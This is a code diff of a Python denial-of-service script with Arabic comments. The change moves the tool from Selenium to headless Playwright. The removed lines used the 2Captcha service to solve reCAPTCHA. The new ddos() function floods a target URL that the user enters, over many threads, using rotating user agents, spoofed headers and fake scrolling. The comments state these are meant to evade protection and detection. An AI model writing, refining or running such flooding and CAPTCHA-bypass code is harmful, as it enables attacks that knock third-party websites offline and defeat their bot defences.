@@ -1,7 +1,6 @@
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-import time
 import random
+import time
+from playwright.sync_api import sync_playwright
 from queue import Queue
 import threading
 
@@ -15,65 +14,43 @@ user_agents = [
 # قائمة عناوين URL المستهدفة
 urls = Queue()
 
-# إضافة وظيفة لحل CAPTCHA باستخدام 2Captcha (اختياري)
-def solve_captcha(site_key, url):
-    api_key = 'YOUR_2CAPTCHA_API_KEY'  # ضع مفتاح API الخاص بك هنا
-    captcha_url = 'http://2captcha.com/in.php'
-    params = {
-        'key': api_key,
-        'method': 'userrecaptcha',
-        'googlekey': site_key,
-        'pageurl': url,
-    }
-    response = requests.post(captcha_url, data=params)
-    request_result = response.text.split('|')
-    
-    if request_result[0] == 'OK':
-        captcha_id = request_result[1]
-        result_url = f'http://2captcha.com/res.php?key={api_key}&action=get&id={captcha_id}'
-        for _ in range(30):  # محاولات للحصول على النتيجة
-            captcha_result = requests.get(result_url)
-            if 'OK' in captcha_result.text:
-                return captcha_result.text.split('|')[1]
-            time.sleep(5)
-    return None
-
+# وظيفة لإرسال الطلبات باستخدام Playwright
 def ddos():
     """
-    إرسال طلبات مع تخطي الحماية.
+    إرسال طلبات للموقع مع تقنيات تخطي الحماية.
     """
-    while not urls.empty():
-        url = urls.get()
-        try:
-            # استخدام Selenium لمحاكاة المتصفح بشكل كامل
-            options = webdriver.ChromeOptions()
-            options.add_argument(f"user-agent={random.choice(user_agents)}")
-            options.add_argument('--headless')  # تشغيل المتصفح في الخلفية
-            driver = webdriver.Chrome(options=options)
+    with sync_playwright() as p:
+        browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"])
+        page = browser.new_page()
 
-            driver.get(url)
+        while not urls.empty():
+            url = urls.get()
+            try:
+                headers = {
+                    "User-Agent": random.choice(user_agents),
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Accept-Encoding": "gzip, deflate, br",
+                }
 
-            # إذا كان الموقع يحتوي على reCAPTCHA أو شيء مشابه، يمكن حل التحدي هنا
-            if "recaptcha" in driver.page_source:
-                site_key = driver.find_element(By.XPATH, '//*[contains(@data-sitekey, "")]').get_attribute('data-sitekey')
-                captcha_solution = solve_captcha(site_key, url)
-                if captcha_solution:
-                    driver.execute_script(f"document.getElementById('g-recaptcha-response').innerHTML = '{captcha_solution}'")
-                    driver.find_element(By.ID, "submit").click()
+                page.set_extra_http_headers(headers)
 
-            # إضافة تأخير عشوائي بين الطلبات لتجنب الكشف
-            time.sleep(random.uniform(1, 4))  # تأخير بين 1 إلى 4 ثواني
-            driver.quit()
+                page.goto(url, wait_until="domcontentloaded", timeout=10000)
 
+                # محاكاة حركة المستخدم (scrolling) لجعل المحاكاة أكثر واقعية
+                page.mouse.wheel(0, 1000)
+                time.sleep(1)
+                page.mouse.wheel(0, -1000)
+
+                print(f"Request sent to {url}, Status: Success")
+
+            except Exception as e:
+                print(f"Error with {url}: {e}")
             urls.task_done()
-        except Exception as e:
-            print(f"Error: {e}")
-            urls.task_done()
 
+        browser.close()
+
+# دالة لإعداد الخيوط
 def main():
-    """
-    الإعداد الرئيسي للهجوم.
-    """
     target = input("Enter the target URL (with http/https): ").strip()
     thread_count = int(input("Enter the number of threads: "))
     request_count = int(input("Enter the total number of requests: "))
